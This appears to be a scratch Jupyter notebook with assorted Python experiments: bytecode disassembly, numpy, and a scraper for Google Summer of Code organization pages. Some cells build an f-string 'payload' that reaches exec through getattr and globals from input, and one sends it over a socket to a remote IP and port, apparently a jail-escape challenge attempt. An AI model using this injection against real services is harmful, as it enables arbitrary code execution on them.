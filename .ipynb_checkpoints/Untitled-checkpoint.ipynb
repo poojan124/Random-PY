{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "import dis\n",
    "import sys"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "def temp():\n",
    "    a=1\n",
    "def foo(f):\n",
    "    return f"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "exec\n"
     ]
    }
   ],
   "source": [
    "t = getattr(__builtin__,input())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "builtin_function_or_method"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "type(t)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "def foo():\n",
    "    print('foo')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [],
   "source": [
    "v1 = 'var1'\n",
    "v2 = 'var2'\n",
    "v3 = 'var3'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "var1__builtin__\n",
      "var2exec\n",
      "var3exit\n",
      "None\n"
     ]
    }
   ],
   "source": [
    "print(f'{getattr(globals()[input(v1)],input(v2))(input(v3))}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "__builtin__\n",
      "exec\n",
      "import numpy as np; arr=np.array([1,2,3,4])\n",
      "None\n"
     ]
    }
   ],
   "source": [
    "print(f'{getattr(globals()[input()],input())(input())}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([1, 2, 3, 4])"
      ]
     },
     "execution_count": 73,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "arr"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "print(f'{getattr(globals()[input()],input())(input())}')\n"
     ]
    }
   ],
   "source": [
    "payload = b\"print(f'{getattr(globals()[input()],input())(input())}')\"\n",
    "print(payload.decode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "s = socket.socket()\n",
    "\n",
    "load = \"f'{getattr(globals()[input()],input())(input())}'\"\n",
    "\n",
    "s.connect((\"35.154.186.5\",8401))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "ename": "ConnectionResetError",
     "evalue": "[Errno 104] Connection reset by peer",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mConnectionResetError\u001b[0m                      Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-42-b74192063775>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0ms\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msend\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mload\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mencode\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mConnectionResetError\u001b[0m: [Errno 104] Connection reset by peer"
     ]
    }
   ],
   "source": [
    "s.send(load.encode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      " 40           0 LOAD_FAST                0 (x)\n",
      "              2 LOAD_CONST               1 (None)\n",
      "              4 COMPARE_OP               8 (is)\n",
      "              6 POP_JUMP_IF_FALSE       22\n",
      "\n",
      " 41           8 LOAD_GLOBAL              0 (distb)\n",
      "             10 LOAD_FAST                1 (file)\n",
      "             12 LOAD_CONST               2 (('file',))\n",
      "             14 CALL_FUNCTION_KW         1\n",
      "             16 POP_TOP\n",
      "\n",
      " 42          18 LOAD_CONST               1 (None)\n",
      "             20 RETURN_VALUE\n",
      "\n",
      " 43     >>   22 LOAD_GLOBAL              1 (hasattr)\n",
      "             24 LOAD_FAST                0 (x)\n",
      "             26 LOAD_CONST               3 ('__func__')\n",
      "             28 CALL_FUNCTION            2\n",
      "             30 POP_JUMP_IF_FALSE       38\n",
      "\n",
      " 44          32 LOAD_FAST                0 (x)\n",
      "             34 LOAD_ATTR                2 (__func__)\n",
      "             36 STORE_FAST               0 (x)\n",
      "\n",
      " 45     >>   38 LOAD_GLOBAL              1 (hasattr)\n",
      "             40 LOAD_FAST                0 (x)\n",
      "             42 LOAD_CONST               4 ('__code__')\n",
      "             44 CALL_FUNCTION            2\n",
      "             46 POP_JUMP_IF_FALSE       54\n",
      "\n",
      " 46          48 LOAD_FAST                0 (x)\n",
      "             50 LOAD_ATTR                3 (__code__)\n",
      "             52 STORE_FAST               0 (x)\n",
      "\n",
      " 47     >>   54 LOAD_GLOBAL              1 (hasattr)\n",
      "             56 LOAD_FAST                0 (x)\n",
      "             58 LOAD_CONST               5 ('gi_code')\n",
      "             60 CALL_FUNCTION            2\n",
      "             62 POP_JUMP_IF_FALSE       70\n",
      "\n",
      " 48          64 LOAD_FAST                0 (x)\n",
      "             66 LOAD_ATTR                4 (gi_code)\n",
      "             68 STORE_FAST               0 (x)\n",
      "\n",
      " 49     >>   70 LOAD_GLOBAL              1 (hasattr)\n",
      "             72 LOAD_FAST                0 (x)\n",
      "             74 LOAD_CONST               6 ('__dict__')\n",
      "             76 CALL_FUNCTION            2\n",
      "             78 POP_JUMP_IF_FALSE      216\n",
      "\n",
      " 50          80 LOAD_GLOBAL              5 (sorted)\n",
      "             82 LOAD_FAST                0 (x)\n",
      "             84 LOAD_ATTR                6 (__dict__)\n",
      "             86 LOAD_ATTR                7 (items)\n",
      "             88 CALL_FUNCTION            0\n",
      "             90 CALL_FUNCTION            1\n",
      "             92 STORE_FAST               2 (items)\n",
      "\n",
      " 51          94 SETUP_LOOP             218 (to 314)\n",
      "             96 LOAD_FAST                2 (items)\n",
      "             98 GET_ITER\n",
      "        >>  100 FOR_ITER               110 (to 212)\n",
      "            102 UNPACK_SEQUENCE          2\n",
      "            104 STORE_FAST               3 (name)\n",
      "            106 STORE_FAST               4 (x1)\n",
      "\n",
      " 52         108 LOAD_GLOBAL              8 (isinstance)\n",
      "            110 LOAD_FAST                4 (x1)\n",
      "            112 LOAD_GLOBAL              9 (_have_code)\n",
      "            114 CALL_FUNCTION            2\n",
      "            116 POP_JUMP_IF_FALSE      100\n",
      "\n",
      " 53         118 LOAD_GLOBAL             10 (print)\n",
      "            120 LOAD_CONST               7 ('Disassembly of %s:')\n",
      "            122 LOAD_FAST                3 (name)\n",
      "            124 BINARY_MODULO\n",
      "            126 LOAD_FAST                1 (file)\n",
      "            128 LOAD_CONST               2 (('file',))\n",
      "            130 CALL_FUNCTION_KW         2\n",
      "            132 POP_TOP\n",
      "\n",
      " 54         134 SETUP_EXCEPT            16 (to 152)\n",
      "\n",
      " 55         136 LOAD_GLOBAL             11 (dis)\n",
      "            138 LOAD_FAST                4 (x1)\n",
      "            140 LOAD_FAST                1 (file)\n",
      "            142 LOAD_CONST               2 (('file',))\n",
      "            144 CALL_FUNCTION_KW         2\n",
      "            146 POP_TOP\n",
      "            148 POP_BLOCK\n",
      "            150 JUMP_FORWARD            48 (to 200)\n",
      "\n",
      " 56     >>  152 DUP_TOP\n",
      "            154 LOAD_GLOBAL             12 (TypeError)\n",
      "            156 COMPARE_OP              10 (exception match)\n",
      "            158 POP_JUMP_IF_FALSE      198\n",
      "            160 POP_TOP\n",
      "            162 STORE_FAST               5 (msg)\n",
      "            164 POP_TOP\n",
      "            166 SETUP_FINALLY           20 (to 188)\n",
      "\n",
      " 57         168 LOAD_GLOBAL             10 (print)\n",
      "            170 LOAD_CONST               8 ('Sorry:')\n",
      "            172 LOAD_FAST                5 (msg)\n",
      "            174 LOAD_FAST                1 (file)\n",
      "            176 LOAD_CONST               2 (('file',))\n",
      "            178 CALL_FUNCTION_KW         3\n",
      "            180 POP_TOP\n",
      "            182 POP_BLOCK\n",
      "            184 POP_EXCEPT\n",
      "            186 LOAD_CONST               1 (None)\n",
      "        >>  188 LOAD_CONST               1 (None)\n",
      "            190 STORE_FAST               5 (msg)\n",
      "            192 DELETE_FAST              5 (msg)\n",
      "            194 END_FINALLY\n",
      "            196 JUMP_FORWARD             2 (to 200)\n",
      "        >>  198 END_FINALLY\n",
      "\n",
      " 58     >>  200 LOAD_GLOBAL             10 (print)\n",
      "            202 LOAD_FAST                1 (file)\n",
      "            204 LOAD_CONST               2 (('file',))\n",
      "            206 CALL_FUNCTION_KW         1\n",
      "            208 POP_TOP\n",
      "            210 JUMP_ABSOLUTE          100\n",
      "        >>  212 POP_BLOCK\n",
      "            214 JUMP_FORWARD            98 (to 314)\n",
      "\n",
      " 59     >>  216 LOAD_GLOBAL              1 (hasattr)\n",
      "            218 LOAD_FAST                0 (x)\n",
      "            220 LOAD_CONST               9 ('co_code')\n",
      "            222 CALL_FUNCTION            2\n",
      "            224 POP_JUMP_IF_FALSE      240\n",
      "\n",
      " 60         226 LOAD_GLOBAL             13 (disassemble)\n",
      "            228 LOAD_FAST                0 (x)\n",
      "            230 LOAD_FAST                1 (file)\n",
      "            232 LOAD_CONST               2 (('file',))\n",
      "            234 CALL_FUNCTION_KW         2\n",
      "            236 POP_TOP\n",
      "            238 JUMP_FORWARD            74 (to 314)\n",
      "\n",
      " 61     >>  240 LOAD_GLOBAL              8 (isinstance)\n",
      "            242 LOAD_FAST                0 (x)\n",
      "            244 LOAD_GLOBAL             14 (bytes)\n",
      "            246 LOAD_GLOBAL             15 (bytearray)\n",
      "            248 BUILD_TUPLE              2\n",
      "            250 CALL_FUNCTION            2\n",
      "            252 EXTENDED_ARG             1\n",
      "            254 POP_JUMP_IF_FALSE      270\n",
      "\n",
      " 62         256 LOAD_GLOBAL             16 (_disassemble_bytes)\n",
      "            258 LOAD_FAST                0 (x)\n",
      "            260 LOAD_FAST                1 (file)\n",
      "            262 LOAD_CONST               2 (('file',))\n",
      "            264 CALL_FUNCTION_KW         2\n",
      "            266 POP_TOP\n",
      "            268 JUMP_FORWARD            44 (to 314)\n",
      "\n",
      " 63     >>  270 LOAD_GLOBAL              8 (isinstance)\n",
      "            272 LOAD_FAST                0 (x)\n",
      "            274 LOAD_GLOBAL             17 (str)\n",
      "            276 CALL_FUNCTION            2\n",
      "            278 EXTENDED_ARG             1\n",
      "            280 POP_JUMP_IF_FALSE      296\n",
      "\n",
      " 64         282 LOAD_GLOBAL             18 (_disassemble_str)\n",
      "            284 LOAD_FAST                0 (x)\n",
      "            286 LOAD_FAST                1 (file)\n",
      "            288 LOAD_CONST               2 (('file',))\n",
      "            290 CALL_FUNCTION_KW         2\n",
      "            292 POP_TOP\n",
      "            294 JUMP_FORWARD            18 (to 314)\n",
      "\n",
      " 66     >>  296 LOAD_GLOBAL             12 (TypeError)\n",
      "            298 LOAD_CONST              10 (\"don't know how to disassemble %s objects\")\n",
      "\n",
      " 67         300 LOAD_GLOBAL             19 (type)\n",
      "            302 LOAD_FAST                0 (x)\n",
      "            304 CALL_FUNCTION            1\n",
      "            306 LOAD_ATTR               20 (__name__)\n",
      "            308 BINARY_MODULO\n",
      "            310 CALL_FUNCTION            1\n",
      "    -->     312 RAISE_VARARGS            1\n",
      "        >>  314 LOAD_CONST               1 (None)\n",
      "            316 RETURN_VALUE\n"
     ]
    }
   ],
   "source": [
    "import dis\n",
    "dis.dis(print())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# GGGGGGGGSSSSSSSSSSSSSSSOOOOOOOOOOOOOOOOOOOOO"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup as bsp\n",
    "def foo(link):\n",
    "    res = requests.get(link)\n",
    "    ele = bsp(res.content,'html.parser')\n",
    "    return [x.text for x in ele.findAll('h4',attrs={'class':'organization-card__name font-black-54'})]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "list16 = foo(\"https://summerofcode.withgoogle.com/archive/2016/organizations/\")\n",
    "list17 = foo(\"https://summerofcode.withgoogle.com/archive/2017/organizations/\")\n",
    "list18 = foo(\"https://summerofcode.withgoogle.com/archive/2018/organizations/\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
